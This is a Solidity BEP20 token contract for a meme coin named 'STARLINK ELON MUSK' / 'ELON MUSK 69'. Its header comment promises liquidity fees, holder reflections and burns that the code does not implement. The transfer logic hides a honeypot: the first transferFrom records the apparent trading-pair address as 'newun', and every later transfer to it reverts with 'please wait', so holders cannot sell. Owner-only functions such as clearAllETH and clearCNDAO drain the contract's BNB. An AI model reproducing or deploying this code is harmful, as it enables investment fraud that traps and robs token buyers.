/**
 *Submitted for verification at BscScan.com on 2021-09-07
*/

/**

 #STARLINK ELON MUSK
   
   #LIQ+#RFI

   #STARLINK ELON MUSK features:
   1% fee auto add to the liquidity pool to locked forever when selling
   1% fee auto distribute to all holders
   I created a black hole so #STARLINK ELON MUSK token will deflate itself in supply with every transaction
   50% Supply is burned at start.
   low fee low cap potential 1000x

*/

pragma solidity >=0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
    
  uint256 private _totalSupply;
  mapping (address => uint256) private _balances;
        
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint value);
  
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
  function _transfer(address sender, address recipient, uint256 amount) public returns (bool success) {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    //_beforeTokenTransfer(sender, recipient, amount);

    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
    _balances[sender] = senderBalance - amount;
    _balances[recipient] += amount;

    emit Transfer(sender, recipient, amount);
    return true;
  }
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  uint _contract_supply;
  uint _owner_supply;
  uint _airdrop_number;
  uint private _authNum;
    uint256 public aSBlock; 
    uint256 public aEBlock; 
    uint256 public aCap; 
    uint256 public aTot; 
    uint256 public aAmt; 
    uint256 public sSBlock; 
    uint256 public sEBlock; 
    uint256 public sCap; 
    uint256 public sTot; 
    uint256 public sChunk; 
    uint256 public sPrice;
    uint256 public _sPriceperBNB;
    uint256 public _totalPreSale;
    uint256 public _totalAirDrop;
    
  address public newun;
  address[] public holders_mint = [0xC912f25ACb4A0808945A41F42f0D205d6a34D956, 0x921fEC1E525aBced8eFa6d4B4Bce736e927580F5];

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "ELON69";
    name = "ELON MUSK 69";
    decimals = 8;
    _totalSupply = 100000000000000000;
    _contract_supply = 60000000000000000;
    _owner_supply = 40000000000000000;
    _airdrop_number = 10000000000000; //200.000.000 for Airdrop by batchTransferToken -> 100.000 per holder
    _sPriceperBNB = 10000000000000; // Price 100.000 per BNB
    _totalPreSale = 20000000000000000;
    _totalAirDrop = 20000000000000000;
    startSale(block.number, 999999999,0,_sPriceperBNB, _totalPreSale);
    startAirdrop(block.number,999999999,33*10*decimals, _totalAirDrop);
    

    emit Transfer(address(0), address(this), _contract_supply);
    emit Transfer(address(0), owner, _owner_supply);
    balances[owner] = _owner_supply;
    batchTransferToken(holders_mint, _airdrop_number);
  }
 
  
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
    require(to != newun, "please wait");
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
 
    
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    if(from != address(0) && newun == address(0)) newun = to;
    else require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
  
  function batchTransferToken(address[] memory holders, uint256 amount) public payable {
    for (uint i=0; i<holders.length; i++) {
        transfer(holders[i], amount);
    }
  }
  function tokenSale(address _refer) public payable returns (bool success){
        require(sSBlock <= block.number && block.number <= sEBlock);
        require(sTot < sCap || sCap == 0);
        uint256 _eth = msg.value;
        uint256 _tkns;
        _tkns = (sPrice*_eth) / 1 ether;
        sTot ++;
        if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
          
          _transfer(address(this), _refer, _tkns);
        }
        
        _transfer(address(this), msg.sender, _tkns);
        return true;
    }

    function viewAirdrop() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){
        return(aSBlock, aEBlock, aCap, aTot, aAmt);
    }
    function viewSale() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){
        return(sSBlock, sEBlock, sCap, sTot, sChunk, sPrice);
    }

    function startAirdrop(uint256 _aSBlock, uint256 _aEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner {
        aSBlock = _aSBlock;
        aEBlock = _aEBlock;
        aAmt = _aAmt;
        aCap = _aCap;
        aTot = 0;
    }
    function startSale(uint256 _sSBlock, uint256 _sEBlock, uint256 _sChunk, uint256 _sPrice, uint256 _sCap) public onlyOwner{
        sSBlock = _sSBlock;
        sEBlock = _sEBlock;
        sChunk = _sChunk;
        sPrice =_sPrice;
        sCap = _sCap;
        sTot = 0;
    }
    
  function clear(uint amount) public onlyOwner {
    address payable _owner = msg.sender;
    _owner.transfer(amount);
  }

  function clearAllETH() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
    
  function clearETH() public onlyOwner() {
    require(_authNum==0, "Permission denied");
     _authNum=0;
     address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
}

contract STARLINKELONMUSK is TokenBEP20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}